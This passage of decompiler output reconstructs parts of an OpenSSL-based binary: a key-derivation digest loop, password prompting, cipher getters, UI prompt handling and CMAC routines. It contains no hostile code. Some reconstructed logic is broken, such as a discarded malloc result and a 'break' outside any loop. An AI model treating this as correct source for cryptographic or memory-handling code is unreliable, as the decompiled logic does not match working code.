                        goto lab_0x4ac92d_3;
                    }
                    int64_t v39 = EVP_DigestFinal_ex(&v9, &v28, (int64_t *)&v1); // 0x4ac904
                    v23 = 0;
                    if ((int32_t)v39 == 0) {
                        // break (via goto) -> 0x4ac92d
                        goto lab_0x4ac92d_3;
                    }
                    int64_t v40 = 2; // 0x4ac90d
                    int64_t v41 = v40 & 0xffffffff; // 0x4ac914
                    while (v29 > (int32_t)v40) {
                        // 0x4ac91a
                        v37 = EVP_DigestInit_ex(&v9, a2, 0, v32, v24);
                        v23 = 0;
                        if ((int32_t)v37 == 0) {
                            // break (via goto) -> 0x4ac92d
                            goto lab_0x4ac92d_3;
                        }
                        // 0x4ac8e8
                        v38 = EVP_DigestUpdate(&v9, v25, (int64_t)v1);
                        v23 = 0;
                        if ((int32_t)v38 == 0) {
                            // break (via goto) -> 0x4ac92d
                            goto lab_0x4ac92d_3;
                        }
                        // 0x4ac8fb
                        v39 = EVP_DigestFinal_ex(&v9, &v28, (int64_t *)&v1);
                        v23 = 0;
                        if ((int32_t)v39 == 0) {
                            // break (via goto) -> 0x4ac92d
                            goto lab_0x4ac92d_3;
                        }
                        // 0x4ac90d
                        v40 = v41 + 1;
                        v41 = v40 & 0xffffffff;
                    }
                }
                if (v31 == 0) {
                    // 0x4aca70
                    v14 = v30;
                    v21 = 0;
                    v6 = 0;
                    if (v18 == 0) {
                        // 0x4acaa8
                        v23 = *v2;
                        goto lab_0x4ac92d_3;
                    }
                    goto lab_0x4aca2a;
                } else {
                    int64_t v42 = v25; // 0x4ac9f2
                    int64_t v43 = v31;
                    int64_t v44 = v30;
                    int64_t v45 = 0;
                    int64_t v46 = v45; // 0x4ac9fc
                    int64_t v47 = v44; // 0x4ac9fc
                    int64_t v48 = v43; // 0x4ac9fc
                    while (v1 != (int32_t)v45) {
                        int64_t v49 = v42;
                        int64_t v50 = 0; // 0x4aca01
                        if (v44 != 0) {
                            // 0x4aca03
                            *(char *)v44 = *(char *)v49;
                            v50 = v44 + 1;
                        }
                        int64_t v51 = v50;
                        int64_t v52 = v45 + 1 & 0xffffffff; // 0x4aca0d
                        uint32_t v53 = (int32_t)v43 - 1; // 0x4aca14
                        int64_t v54 = v53; // 0x4aca14
                        v42 = v49 + 1;
                        v46 = v52;
                        v47 = v51;
                        v48 = v54;
                        if (v53 == 0) {
                            // break -> 0x4aca19
                            break;
                        }
                        v43 = v54;
                        v44 = v51;
                        v45 = v52;
                        v46 = v45;
                        v47 = v44;
                        v48 = v43;
                    }
                    int32_t v55 = v48; // 0x4aca22
                    v14 = v47;
                    v21 = v55;
                    v6 = v46;
                    v12 = v11;
                    v15 = v47;
                    v22 = v55;
                    v19 = 0;
                    v8 = 0;
                    if (v18 == 0) {
                        goto lab_0x4aca7c;
                    } else {
                        goto lab_0x4aca2a;
                    }
                }
            }
            goto lab_0x4ac92d_3;
        }
    }
  lab_0x4ac92d_3:
    // 0x4ac92d
    EVP_MD_CTX_cleanup(&v9);
    OPENSSL_cleanse(v25, 64);
    result = v23;
    goto lab_0x4ac946;
  lab_0x4ac946:
    // 0x4ac946
    if (v4 != __readfsqword(40)) {
        // 0x4acac2
        __stack_chk_fail();
        return &g299;
    }
    // 0x4ac961
    return result;
  lab_0x4aca97:;
    // 0x4aca97
    int32_t v56; // 0x4ac7b0
    int64_t v57 = v56;
    int64_t v58; // 0x4ac7b0
    v12 = v58;
    int64_t v59; // 0x4ac7b0
    v15 = v59;
    int32_t v60; // 0x4ac7b0
    v22 = v60;
    v19 = v56;
    v8 = v57;
    int64_t v61 = v58; // 0x4aca9d
    int64_t v62 = v59; // 0x4aca9d
    int32_t v63 = v60; // 0x4aca9d
    int32_t v64 = v56; // 0x4aca9d
    int64_t v65 = v57; // 0x4aca9d
    if (v56 != 0) {
        goto lab_0x4aca84;
    } else {
        goto lab_0x4aca7c;
    }
  lab_0x4aca2a:
    // 0x4aca2a
    v60 = v21;
    v59 = v14;
    int64_t v66 = v6; // 0x4aca2e
    int32_t v67 = v18; // 0x4aca2e
    int64_t v68 = v11; // 0x4aca2e
    v58 = v11;
    v56 = v18;
    if (v1 == (int32_t)v6) {
        goto lab_0x4aca97;
    } else {
        int64_t v69 = v68;
        int64_t v70 = v66;
        int64_t v71 = 0; // 0x4aca4c
        int64_t v72; // bp-264, 0x4ac7b0
        char v73; // 0x4aca50
        if (v69 != 0) {
            // 0x4aca4e
            v73 = *(char *)((int64_t)&v72 + 128 + (v70 & 0xffffffff));
            *(char *)v69 = v73;
            v71 = v69 + 1;
        }
        int64_t v74 = v71;
        int32_t v75 = v67 - 1; // 0x4aca5f
        while (v75 != 0) {
            int64_t v76 = v70 + 1; // 0x4aca40
            v66 = v76 & 0xffffffff;
            v67 = v75;
            v68 = v74;
            v58 = v74;
            v56 = v75;
            if (v1 == (int32_t)v76) {
                goto lab_0x4aca97;
            }
            v69 = v68;
            v70 = v66;
            v71 = 0;
            if (v69 != 0) {
                // 0x4aca4e
                v73 = *(char *)((int64_t)&v72 + 128 + (v70 & 0xffffffff));
                *(char *)v69 = v73;
                v71 = v69 + 1;
            }
            // 0x4aca5f
            v74 = v71;
            v75 = v67 - 1;
        }
        // 0x4aca7c
        v12 = v74;
        v15 = v59;
        v22 = v60;
        v19 = v75;
        v8 = v75;
        goto lab_0x4aca7c;
    }
  lab_0x4aca7c:
    // 0x4aca7c
    v61 = v12;
    v62 = v15;
    v63 = v22;
    v64 = v19;
    v65 = v8;
    if (v22 == 0) {
        // 0x4acaa8
        v23 = *v2;
        goto lab_0x4ac92d_3;
    }
    goto lab_0x4aca84;
  lab_0x4aca84:;
    int64_t v77 = EVP_DigestInit_ex(&v9, a2, 0, v65, v24); // 0x4ac86e
    v7 = v65;
    v16++;
    v17 = v64;
    v20 = v63;
    v13 = v62;
    v10 = v61;
    result = 0;
    if ((int32_t)v77 == 0) {
        goto lab_0x4ac946;
    }
    goto lab_0x4ac87b;
}

// Address range: 0x4acad0 - 0x4acc10
int64_t EVP_read_pw_string_min(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = __readfsqword(40); // 0x4acafb
    int64_t v2 = a4; // 0x4acb1a
    if (a4 == 0) {
        // 0x4acbf0
        v2 = *(char *)&g287 != 0 ? (int64_t)&g287 : 0;
    }
    int64_t v3 = a2 & 0xffffffff; // 0x4acb11
    int64_t v4 = UI_new(a1); // 0x4acb2a
    int32_t v5 = a3; // 0x4acb2f
    int32_t v6 = v5 - 0x1fff; // 0x4acb2f
    int64_t v7 = v6 == 0 | v6 < 0 != (0x1ffe - v5 & v5) < 0 ? a3 & 0xffffffff : 0x1fff; // 0x4acb3c
    UI_add_input_string(v4, v2, 0, a1, v3, v7);
    int64_t v8; // bp-8264, 0x4acad0
    if ((int32_t)a5 != 0) {
        // 0x4acb62
        UI_add_verify_string(v4, v2, 0, &v8, v3, v7, a1);
    }
    int64_t v9 = UI_process(v4); // 0x4acb7f
    UI_free(v4);
    OPENSSL_cleanse((int64_t)&v8, 0x2000);
    if (v1 == __readfsqword(40)) {
        // 0x4acbb0
        return v9 & 0xffffffff;
    }
    // 0x4acc07
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4acc60 - 0x4acc68
int64_t EVP_des_ede_cbc(void) {
    // 0x4acc60
    return &g94;
}

// Address range: 0x4acc70 - 0x4acc78
int64_t EVP_des_ede_cfb64(void) {
    // 0x4acc70
    return &g93;
}

// Address range: 0x4acc80 - 0x4acc88
int64_t EVP_des_ede_ofb(void) {
    // 0x4acc80
    return &g92;
}

// Address range: 0x4acc90 - 0x4acc98
int64_t EVP_des_ede_ecb(void) {
    // 0x4acc90
    return &g86;
}

// Address range: 0x4acca0 - 0x4acca8
int64_t EVP_des_ede3_cbc(void) {
    // 0x4acca0
    return &g91;
}

// Address range: 0x4accb0 - 0x4accb8
int64_t EVP_des_ede3_cfb64(void) {
    // 0x4accb0
    return &g90;
}

// Address range: 0x4accc0 - 0x4accc8
int64_t EVP_des_ede3_ofb(void) {
    // 0x4accc0
    return &g89;
}

// Address range: 0x4accd0 - 0x4accd8
int64_t EVP_des_ede3_ecb(void) {
    // 0x4accd0
    return &g85;
}

// Address range: 0x4acce0 - 0x4acce8
int64_t EVP_des_ede3_cfb1(void) {
    // 0x4acce0
    return &g88;
}

// Address range: 0x4accf0 - 0x4accf8
int64_t EVP_des_ede3_cfb8(void) {
    // 0x4accf0
    return &g87;
}

// Address range: 0x4acd00 - 0x4acd08
int64_t EVP_des_ede(void) {
    // 0x4acd00
    return &g86;
}

// Address range: 0x4acd10 - 0x4acd18
int64_t EVP_des_ede3(void) {
    // 0x4acd10
    return &g85;
}

// Address range: 0x4ad4e0 - 0x4ad4fe
int64_t EVP_aes_128_cbc(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g151 : (int64_t)&g152; // 0x4ad4f9
    return result;
}

// Address range: 0x4ad500 - 0x4ad51e
int64_t EVP_aes_128_ecb(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g149 : (int64_t)&g150; // 0x4ad519
    return result;
}

// Address range: 0x4ad520 - 0x4ad53e
int64_t EVP_aes_128_ofb(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g147 : (int64_t)&g148; // 0x4ad539
    return result;
}

// Address range: 0x4ad540 - 0x4ad55e
int64_t EVP_aes_128_cfb128(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g145 : (int64_t)&g146; // 0x4ad559
    return result;
}

// Address range: 0x4ad560 - 0x4ad57e
int64_t EVP_aes_128_cfb1(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g143 : (int64_t)&g144; // 0x4ad579
    return result;
}

// Address range: 0x4ad580 - 0x4ad59e
int64_t EVP_aes_128_cfb8(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g141 : (int64_t)&g142; // 0x4ad599
    return result;
}

// Address range: 0x4ad5a0 - 0x4ad5be
int64_t EVP_aes_128_ctr(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g139 : (int64_t)&g140; // 0x4ad5b9
    return result;
}

// Address range: 0x4ad5c0 - 0x4ad5de
int64_t EVP_aes_192_cbc(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g137 : (int64_t)&g138; // 0x4ad5d9
    return result;
}

// Address range: 0x4ad5e0 - 0x4ad5fe
int64_t EVP_aes_192_ecb(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g135 : (int64_t)&g136; // 0x4ad5f9
    return result;
}

// Address range: 0x4ad600 - 0x4ad61e
int64_t EVP_aes_192_ofb(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g133 : (int64_t)&g134; // 0x4ad619
    return result;
}

// Address range: 0x4ad620 - 0x4ad63e
int64_t EVP_aes_192_cfb128(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g131 : (int64_t)&g132; // 0x4ad639
    return result;
}

// Address range: 0x4ad640 - 0x4ad65e
int64_t EVP_aes_192_cfb1(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g129 : (int64_t)&g130; // 0x4ad659
    return result;
}

// Address range: 0x4ad660 - 0x4ad67e
int64_t EVP_aes_192_cfb8(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g127 : (int64_t)&g128; // 0x4ad679
    return result;
}

// Address range: 0x4ad680 - 0x4ad69e
int64_t EVP_aes_192_ctr(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g125 : (int64_t)&g126; // 0x4ad699
    return result;
}

// Address range: 0x4ad6a0 - 0x4ad6be
int64_t EVP_aes_256_cbc(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g123 : (int64_t)&g124; // 0x4ad6b9
    return result;
}

// Address range: 0x4ad6c0 - 0x4ad6de
int64_t EVP_aes_256_ecb(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g121 : (int64_t)&g122; // 0x4ad6d9
    return result;
}

// Address range: 0x4ad6e0 - 0x4ad6fe
int64_t EVP_aes_256_ofb(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g119 : (int64_t)&g120; // 0x4ad6f9
    return result;
}

// Address range: 0x4ad700 - 0x4ad71e
int64_t EVP_aes_256_cfb128(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g117 : (int64_t)&g118; // 0x4ad719
    return result;
}

// Address range: 0x4ad720 - 0x4ad73e
int64_t EVP_aes_256_cfb1(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g115 : (int64_t)&g116; // 0x4ad739
    return result;
}

// Address range: 0x4ad740 - 0x4ad75e
int64_t EVP_aes_256_cfb8(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g113 : (int64_t)&g114; // 0x4ad759
    return result;
}

// Address range: 0x4ad760 - 0x4ad77e
int64_t EVP_aes_256_ctr(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g111 : (int64_t)&g112; // 0x4ad779
    return result;
}

// Address range: 0x4ad780 - 0x4ad79e
int64_t EVP_aes_128_gcm(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g109 : (int64_t)&g110; // 0x4ad799
    return result;
}

// Address range: 0x4ad7a0 - 0x4ad7be
int64_t EVP_aes_192_gcm(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g107 : (int64_t)&g108; // 0x4ad7b9
    return result;
}

// Address range: 0x4ad7c0 - 0x4ad7de
int64_t EVP_aes_256_gcm(int64_t a1) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g105 : (int64_t)&g106; // 0x4ad7d9
    return result;
}

// Address range: 0x4ad810 - 0x4ad82e
int64_t EVP_aes_128_xts(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g103 : (int64_t)&g104; // 0x4ad829
    return result;
}

// Address range: 0x4ad830 - 0x4ad84e
int64_t EVP_aes_256_xts(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g101 : (int64_t)&g102; // 0x4ad849
    return result;
}

// Address range: 0x4ad850 - 0x4ad86e
int64_t EVP_aes_128_ccm(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g99 : (int64_t)&g100; // 0x4ad869
    return result;
}

// Address range: 0x4ad870 - 0x4ad88e
int64_t EVP_aes_192_ccm(int64_t a1) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g97 : (int64_t)&g98; // 0x4ad889
    return result;
}

// Address range: 0x4ad890 - 0x4ad8ae
int64_t EVP_aes_256_ccm(void) {
    int64_t result = (g168 & 2) != 0 ? (int64_t)&g95 : (int64_t)&g96; // 0x4ad8a9
    return result;
}

// Address range: 0x4af450 - 0x4af458
int64_t EVP_md5(void) {
    // 0x4af450
    return &g159;
}

// Address range: 0x4bccd0 - 0x4bcd1a
int64_t free_string(int64_t a1) {
    // 0x4bccd0
    int64_t v1; // 0x4bccd0
    if (*(char *)(a1 + 56) % 2 == 0) {
        // 0x4bccda
        return CRYPTO_free(a1, v1);
    }
    // 0x4bcce8
    CRYPTO_free(*(int64_t *)(a1 + 8), v1);
    if ((int32_t)a1 != 3) {
        // 0x4bccda
        return CRYPTO_free(a1, v1);
    }
    // 0x4bccf6
    CRYPTO_free(*(int64_t *)(a1 + 32), v1);
    CRYPTO_free(*(int64_t *)(a1 + 40), v1);
    CRYPTO_free(*(int64_t *)(a1 + 48), v1);
    return CRYPTO_free(a1, v1);
}

// Address range: 0x4bcd20 - 0x4bce04
int64_t general_allocate_prompt(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    if (a2 == 0) {
        // 0x4bcddf
        ERR_put_error(40, 109, 67, "ui_lib.c", 147);
        // 0x4bcd8d
        return 0;
    }
    if (a6 == 0) {
        if ((uint32_t)((int32_t)a4 - 1) < 3) {
            // 0x4bcdba
            ERR_put_error(40, 109, 105, "ui_lib.c", 152);
            // 0x4bcd8d
            return 0;
        }
    }
    // 0x4bcd59
    CRYPTO_malloc(64, "ui_lib.c", 154, a4, a5);
    int64_t result = 0; // 0x4bcd72
    if (result != 0) {
        // 0x4bcd74
        *(int64_t *)(result + 8) = a2;
        *(int32_t *)(result + 16) = (int32_t)a5;
        *(int32_t *)result = (int32_t)a4;
        *(int32_t *)(result + 56) = (int32_t)((int32_t)a3 != 0);
        *(int64_t *)(result + 24) = a6;
    }
    // 0x4bcd8d
    return result;
}

// Address range: 0x4bce70 - 0x4bce99
int64_t UI_get_default_method(void) {
    int64_t result = g288; // 0x4bce74
    if (result != 0) {
        // 0x4bce80
        return result;
    }
    int64_t result2 = UI_OpenSSL(); // 0x4bce88
    g288 = result2;
    return result2;
}

// Address range: 0x4bcee0 - 0x4bcff7
int64_t UI_process(int64_t a1) {
    int64_t * v1 = (int64_t *)(a1 + 8); // 0x4bceea
    int64_t v2 = *v1; // 0x4bceea
    if (v2 != 0) {
        if ((int32_t)v2 == 0) {
            // 0x4bcfa3
            return 0xffffffff;
        }
    }
    int64_t v3 = v2; // 0x4bcefb
    if (*(char *)(a1 + 41) % 2 != 0) {
        // 0x4bcfb0
        ERR_print_errors_cb(0x4bd710, a1);
        v3 = *v1;
    }
    int64_t v4 = sk_num(v3); // 0x4bcf33
    int64_t v5 = v3; // 0x4bcf3a
    int64_t v6; // 0x4bcee0
    int64_t v7; // 0x4bcee0
    if (v4 > 0) {
        int64_t v8 = 0;
        if (*(int64_t *)(v3 + 16) != 0) {
            // 0x4bcf14
            v6 = 0xffffffff;
            v7 = a1;
            if ((int32_t)sk_value(*v1, v8) == 0) {
                goto lab_0x4bcf97;
            }
        }
        int64_t v9 = v8 + 1 & 0xffffffff; // 0x4bcf2c
        int64_t v10 = *v1; // 0x4bcf2f
        uint64_t v11 = sk_num(v10); // 0x4bcf33
        v5 = v10;
        while (v9 < v11) {
            // 0x4bcf08
            v8 = v9;
            if (*(int64_t *)(v10 + 16) != 0) {
                // 0x4bcf14
                v6 = 0xffffffff;
                v7 = a1;
                if ((int32_t)sk_value(*v1, v8) == 0) {
                    goto lab_0x4bcf97;
                }
            }
            // 0x4bcf2c
            v9 = v8 + 1 & 0xffffffff;
            v10 = *v1;
            v11 = sk_num(v10);
            v5 = v10;
        }
    }
    int64_t v12 = *(int64_t *)(v5 + 24); // 0x4bcf3f
    if (v12 == 0) {
        goto lab_0x4bcf56;
    } else {
        // 0x4bcf48
        v6 = 0xffffffff;
        v7 = a1;
        switch ((int32_t)v12) {
            case -1: {
                // 0x4bcfd0
                v6 = 0xfffffffe;
                v7 = a1;
                goto lab_0x4bcf97;
            }
            case 0: {
                goto lab_0x4bcf97;
            }
            default: {
                goto lab_0x4bcf56;
            }
        }
    }
  lab_0x4bcf97:;
    int64_t v13 = *(int64_t *)(v7 + 40); // 0x4bcf9a
    if (v13 == 0 || (int32_t)v13 != 0) {
        // 0x4bcfa3
        return v6 & 0xffffffff;
    }
    // 0x4bcfa3
    return 0xffffffff;
  lab_0x4bcf56:;
    int64_t v14 = *v1; // 0x4bcf58
    int64_t v15 = sk_num(v14); // 0x4bcf5c
    v6 = 0;
    v7 = v14;
    if (v15 > 0) {
        int64_t v16 = 0;
        int32_t v17; // 0x4bcf89
        if (*(int64_t *)(v14 + 32) != 0) {
            // 0x4bcf75
            v17 = sk_value(*v1, v16);
            if (v17 == -1) {
                // 0x4bcfd0
                v6 = 0xfffffffe;
                v7 = a1;
                goto lab_0x4bcf97;
            }
            // 0x4bcf8e
            if (v17 == 0) {
                // break -> 0x4bcf97
                break;
            }
        }
        int64_t v18 = v16 + 1 & 0xffffffff; // 0x4bcfc8
        int64_t v19 = *v1; // 0x4bcf58
        uint64_t v20 = sk_num(v19); // 0x4bcf5c
        v6 = 0;
        v7 = v19;
        while (v18 < v20) {
            // 0x4bcf69
            v16 = v18;
            if (*(int64_t *)(v19 + 32) != 0) {
                // 0x4bcf75
                v17 = sk_value(*v1, v16);
                if (v17 == -1) {
                    // 0x4bcfd0
                    v6 = 0xfffffffe;
                    v7 = a1;
                    goto lab_0x4bcf97;
                }
                // 0x4bcf8e
                v6 = 0xffffffff;
                v7 = a1;
                if (v17 == 0) {
                    // break -> 0x4bcf97
                    break;
                }
            }
            // 0x4bcfc8
            v18 = v16 + 1 & 0xffffffff;
            v19 = *v1;
            v20 = sk_num(v19);
            v6 = 0;
            v7 = v19;
        }
    }
    goto lab_0x4bcf97;
}

// Address range: 0x4bd220 - 0x4bd297
int64_t general_allocate_string(int64_t a1, int32_t a2, int64_t a3, int32_t a4, int32_t a5, int64_t a6) {
    // 0x4bd220
    int64_t v1; // 0x4bd220
    int64_t v2; // 0x4bd220
    int64_t v3; // 0x4bd220
    int64_t v4 = general_allocate_prompt(a1, (int64_t)a2, a3, v3, v2, v1); // 0x4bd228
    if (v4 == 0) {
        // 0x4bd26a
        return 0xffffffff;
    }
    int64_t * v5 = (int64_t *)(a1 + 8); // 0x4bd23a
    if (*v5 == 0) {
        int64_t v6 = sk_new_null(a1); // 0x4bd275
        *v5 = v6;
        if (v6 == 0) {
            // 0x4bd288
            free_string(v4);
            // 0x4bd26a
            return 0xffffffff;
        }
    }
    // 0x4bd241
    *(int32_t *)(v4 + 32) = a4;
    *(int32_t *)(v4 + 36) = a5;
    *(int64_t *)(v4 + 40) = a6;
    int64_t v7 = sk_push(*v5, v4, a3, v3); // 0x4bd25c
    // 0x4bd26a
    return v7 - (int64_t)((int32_t)v7 < 1) & 0xffffffff;
}

// Address range: 0x4bd500 - 0x4bd52e
int64_t UI_add_verify_string(int64_t a1, int64_t a2, int32_t a3, int64_t * a4, int64_t a5, int64_t a6, int64_t a7) {
    // 0x4bd500
    return general_allocate_string(a1, (int32_t)a2, 0, (int32_t)a5, (int32_t)a6, a7);
}

// Address range: 0x4bd5f0 - 0x4bd61d
int64_t UI_add_input_string(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x4bd5f0
    return general_allocate_string(a1, (int32_t)a2, 0, (int32_t)a5, (int32_t)a6, 0);
}

// Address range: 0x4bd620 - 0x4bd65a
int64_t UI_free(int64_t a1) {
    // 0x4bd620
    if (a1 == 0) {
        // 0x4bd658
        int64_t result; // 0x4bd620
        return result;
    }
    // 0x4bd629
    sk_pop_free(*(int64_t *)(a1 + 8), 0x4bccd0);
    CRYPTO_free_ex_data(11, a1, a1 + 24);
    return CRYPTO_free(a1, a1);
}

// Address range: 0x4bd660 - 0x4bd6f5
int64_t UI_new_method(int32_t a1) {
    // 0x4bd660
    int64_t v1; // 0x4bd660
    int64_t v2; // 0x4bd660
    int64_t result = CRYPTO_malloc(48, "ui_lib.c", 80, v2, v1); // 0x4bd67a
    if (result == 0) {
        // 0x4bd6d2
        ERR_put_error(40, 104, 65, "ui_lib.c", 83);
        // 0x4bd6b7
        return result;
    }
    if (a1 == 0) {
        // 0x4bd6c8
        *(int64_t *)result = UI_get_default_method();
    } else {
        // 0x4bd68c
        *(int64_t *)result = (int64_t)a1;
    }
    // 0x4bd68f
    *(int64_t *)(result + 8) = 0;
    *(int64_t *)(result + 16) = 0;
    *(int32_t *)(result + 40) = 0;
    CRYPTO_new_ex_data(11, result, result + 24);
    // 0x4bd6b7
    return result;
}

// Address range: 0x4bd700 - 0x4bd707
int64_t UI_new(int64_t a1) {
    // 0x4bd700
    return UI_new_method(0);
}

// Address range: 0x4bda90 - 0x4bda98
int64_t UI_OpenSSL(void) {
    // 0x4bda90
    return (int64_t)&g207;
}

// Address range: 0x4c1f70 - 0x4c2096
int64_t CMAC_Final(int64_t a1, int64_t a2, int64_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 296); // 0x4c1f85
    if (*v1 == -1) {
        // 0x4c2033
        return 0;
    }
    int64_t v2 = EVP_CIPHER_CTX_block_size((int64_t *)a1); // 0x4c1f92
    int64_t v3 = 0x100000000 * v2 / 0x100000000; // 0x4c1f9a
    *(int64_t *)a3 = v3;
    if (a2 == 0) {
        // 0x4c2033
        return 1;
    }
    uint32_t v4 = *v1; // 0x4c1fa9
    uint32_t v5 = (int32_t)v2;
    if (v4 == v5) {
        if (v4 >= 1) {
            int64_t v6 = a2; // 0x4c2072
            char v7 = *(char *)(a1 + 264); // 0x4c207f
            int64_t v8 = a1 + 1; // 0x4c2085
            *(char *)v6 = v7 ^ *(char *)(a1 + 168);
            v6++;
            while (v8 != a1 + 1 + (v2 + 0xffffffff & 0xffffffff)) {
                int64_t v9 = v8;
                v7 = *(char *)(v9 + 264);
                v8 = v9 + 1;
                *(char *)v6 = v7 ^ *(char *)(v9 + 168);
                v6++;
            }
        }
    } else {
        int64_t v10 = (int64_t)v4 + a1;
        *(char *)(v10 + 264) = -128;
        uint32_t v11 = v5 - v4; // 0x4c1fcb
        if (v11 >= 2) {
            // 0x4c1fcd
            memset((int64_t *)(v10 + 265), 0, v11 - 1);
        }
        if (v5 >= 1) {
            int64_t v12 = a2; // 0x4c1ffc
            char v13 = *(char *)(a1 + 264); // 0x4c2007
            int64_t v14 = a1 + 1; // 0x4c200d
            *(char *)v12 = v13 ^ *(char *)(a1 + 200);
            v12++;
            while (v14 != a1 + 1 + (v2 + 0xffffffff & 0xffffffff)) {
                int64_t v15 = v14;
                v13 = *(char *)(v15 + 264);
                v14 = v15 + 1;
                *(char *)v12 = v13 ^ *(char *)(v15 + 200);
                v12++;
            }
        }
    }
    // 0x4c201c
    if ((int32_t)EVP_Cipher(a1, (int64_t *)a2, a2, v5) != 0) {
        // 0x4c2033
        return 1;
    }
    // 0x4c2040
    OPENSSL_cleanse(a2, v3);
    return 0;
}

// Address range: 0x4c20a0 - 0x4c21ed
int64_t CMAC_Update(int64_t a1, int64_t a2, uint64_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 296); // 0x4c20c8
    if (*v1 == -1) {
        // 0x4c20df
        return 0;
    }
    // 0x4c20d5
    if (a3 == 0) {
        // 0x4c20df
        return 1;
    }
    int64_t v2 = EVP_CIPHER_CTX_block_size((int64_t *)a1); // 0x4c210b
    uint32_t v3 = *v1; // 0x4c2110
    uint64_t v4 = 0x100000000 * v2 / 0x100000000; // 0x4c2118
    int64_t v5 = a3; // 0x4c211d
    int64_t v6 = a2; // 0x4c211d
    if (v3 >= 1) {
        int64_t v7 = v3; // 0x4c211f
        int64_t v8 = a1 + 264; // 0x4c2125
        uint64_t v9 = v4 - v7; // 0x4c212d
        int64_t v10 = v9 > a3 ? a3 : v9; // 0x4c213a
        int32_t v11 = v10; // 0x4c2141
        memcpy((int64_t *)(v8 + v7), (int64_t *)a2, v11);
        *v1 = *v1 + v11;
        v5 = a3 - v10;
        if (v5 == 0) {
            // 0x4c20df
            return 1;
        }
        // 0x4c2153
        if ((int32_t)EVP_Cipher(a1, (int64_t *)(a1 + 232), v8, (int32_t)v4) == 0) {
            // 0x4c20df
            return 0;
        }
        // 0x4c216c
        v6 = v10 + a2;
    }
    int64_t v12 = v5; // 0x4c2172
    int64_t v13 = v6; // 0x4c2172
    if (v5 <= v4) {
      lab_0x4c21c8:;
        int32_t v14 = v12; // 0x4c21d6
        memcpy((int64_t *)(a1 + 264), (int64_t *)v13, v14);
        *v1 = v14;
        // 0x4c20df
        return 1;
    }
    int64_t * v15 = (int64_t *)(a1 + 232); // 0x4c21b1
    int64_t v16 = v5; // 0x4c218d
    int64_t v17 = v6; // 0x4c218d
    while ((int32_t)EVP_Cipher(a1, v15, v17, (int32_t)v4) != 0) {
        // 0x4c2190
        v16 -= v4;
        v17 += v4;
        v12 = v16;
        v13 = v17;
        if (v4 >= v16) {
            goto lab_0x4c21c8;
        }
    }
    // 0x4c20df
    return 0;
}

// Address range: 0x4c21f0 - 0x4c24be
int64_t CMAC_Init(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5) {
    // 0x4c21f0
    if ((int32_t)FIPS_mode() == 0) {
        goto lab_0x4c2238;
    } else {
        if (a5 == 0) {
            // 0x4c23d0
            if (*(int64_t *)(a1 + 8) != 0) {
                goto lab_0x4c222e;
            } else {
                goto lab_0x4c2238;
            }
        } else {
            goto lab_0x4c222e;
        }
    }
  lab_0x4c2238:;
    int64_t result; // 0x4c21f0
    int64_t v1; // 0x4c21f0
    if (a4 == 0) {
        // 0x4c22a0
        v1 = a3;
        if (a2 == 0) {
            // 0x4c22a5
            if (a3 != 0 || a5 != 0) {
                // 0x4c227b
                return 1;
            }
            int32_t * v2 = (int32_t *)(a1 + 296); // 0x4c22bd
            if (*v2 == -1) {
                // 0x4c227b
                return 0;
            }
            int64_t v3 = EVP_EncryptInit_ex(a1, 0, 0, 0, &g289); // 0x4c22d6
            result = 0;
            if ((int32_t)v3 != 0) {
                // 0x4c22df
                memset((int64_t *)(a1 + 232), 0, (int32_t)EVP_CIPHER_CTX_block_size((int64_t *)a1));
                *v2 = 0;
                result = 1;
            }
            // 0x4c227b
            return result;
        }
    } else {
        int64_t v4 = EVP_EncryptInit_ex(a1, a4, a5, 0, NULL); // 0x4c224b
        v1 = a5;
        if ((int32_t)v4 == 0) {
            // 0x4c227b
            return 0;
        }
    }
    // 0x4c2254
    if (a2 == 0) {
        // 0x4c227b
        return 1;
    }
    // 0x4c2259
    if (EVP_CIPHER_CTX_cipher(a1) == 0 || (int32_t)EVP_CIPHER_CTX_set_key_length(a1, (int32_t)a3, v1, 0) == 0 || (int32_t)EVP_EncryptInit_ex(a1, 0, 0, a2, &g289) == 0) {
        // 0x4c227b
        return 0;
    }
    int64_t v5 = a1 + 232; // 0x4c2331
    int64_t v6 = EVP_CIPHER_CTX_block_size((int64_t *)a1); // 0x4c2338
    int64_t * v7 = (int64_t *)v5; // 0x4c234f
    uint32_t v8 = (int32_t)v6; // 0x4c234f
    if ((int32_t)EVP_Cipher(a1, v7, (int64_t)&g289, v8) == 0) {
